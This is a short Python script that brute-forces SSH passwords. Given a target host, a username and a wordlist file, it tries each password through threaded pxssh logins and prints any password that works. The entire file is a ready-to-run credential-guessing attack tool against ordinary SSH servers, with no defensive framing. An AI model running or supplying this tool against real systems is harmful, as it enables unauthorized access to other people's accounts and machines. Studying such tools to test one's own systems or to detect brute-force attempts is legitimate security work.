from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 10

connectionLock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found #So that the global variable can be modifed from this function
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, username=user, password=password, login_timeout=20)
        print(f'[+] Password Found: {password}')
        Found = True
    except pxssh.ExceptionPxssh as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connectionLock.release()

def main():
    parser = argparse.ArgumentParser(description="-H <Target Host> -U <Username> -F <Password File>")

    parser.add_argument('-H', '--host',type=str, help='Specify Target host')
    parser.add_argument('-U', '--username', type=str, help='Username to Initiate Connection')
    parser.add_argument('-F', '--passwordfile', type=str, help='Specify Password File')

    options = parser.parse_args()

    host = options.host
    username = options.username
    passwordFilePath = options.passwordfile

    if host == None or username == None or passwordFilePath == None:
        parser.print_help()
        exit(0)

    with open(passwordFilePath,'r') as passwordFile:
        for passwordLine in passwordFile:
            if Found:
                print(f'[*] Exiting: Password Found')
                exit(0)
            if Fails > 5:
                print(f'Exiting: too many socket Timeouts')
                exit(0)
            
            connectionLock.acquire()
            password = passwordLine.strip('\r').strip('\n')
            print(f'[.] Testing : {password}')

            t = threading.Thread(target = connect, args=(host, username, password, True))
            t.start()

if __name__ == '__main__':
    main()

